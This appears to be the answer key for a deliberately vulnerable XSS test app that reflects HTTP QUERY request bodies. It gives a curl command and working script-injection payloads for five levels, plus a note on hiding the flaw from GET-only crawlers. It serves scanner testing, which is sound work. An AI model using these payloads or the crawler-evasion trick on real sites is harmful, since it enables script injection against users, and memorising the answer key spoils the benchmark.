# querymethod — solutions

HTTP QUERY (RFC 10008) reflection: a safe, idempotent method that carries its
input in the request body. The GET page on each path is only a browser driver
(`fetch(..., {method: 'QUERY'})`); the vulnerable request is the QUERY one.

Kemal answers `400` before the handler when a QUERY request has a body but no
`Content-Type`, so every payload below needs an explicit content type.

```
curl -X QUERY -H 'Content-Type: application/x-www-form-urlencoded' \
     --data-urlencode 'query=<script>alert(1)</script>' \
     http://127.0.0.1:3000/querymethod/level1/
```

### querymethod-level1

`[QUERY] /querymethod/level1/`

- payload: `<script>alert(1)</script>`
- body: `query=<script>alert(1)</script>` (Content-Type: application/x-www-form-urlencoded)
- context: raw body reflection

### querymethod-level2

`[QUERY] /querymethod/level2/`

- payload: `<img src=x onerror=alert(1)>`
- body: `{"query":"<img src=x onerror=alert(1)>"}` (Content-Type: application/json)
- context: JSON body reflected raw

### querymethod-level3

`[QUERY] /querymethod/level3/`

- payload: `" onfocus=alert(1) autofocus x="`
- body: `query=" onfocus=alert(1) autofocus x="` (Content-Type: application/x-www-form-urlencoded)
- context: reflected in <input value="QUERY"> attribute breakout

### querymethod-level4

`[QUERY] /querymethod/level4/`

- payload: `</script><script>alert(1)</script>`
- body: `query=</script><script>alert(1)</script>` (Content-Type: application/x-www-form-urlencoded)
- context: inside <script>var q="QUERY"; close script tag

### querymethod-level5

`[QUERY] /querymethod/level5/`

- payload: `<script>alert(1)</script>`
- body: `query=<script>alert(1)</script>` (Content-Type: application/x-www-form-urlencoded)
- context: method confusion — `GET /querymethod/level5/?query=` HTML-escapes and
  is safe; only the QUERY body reaches the raw sink, so a crawler that treats
  the endpoint as a plain read finds nothing
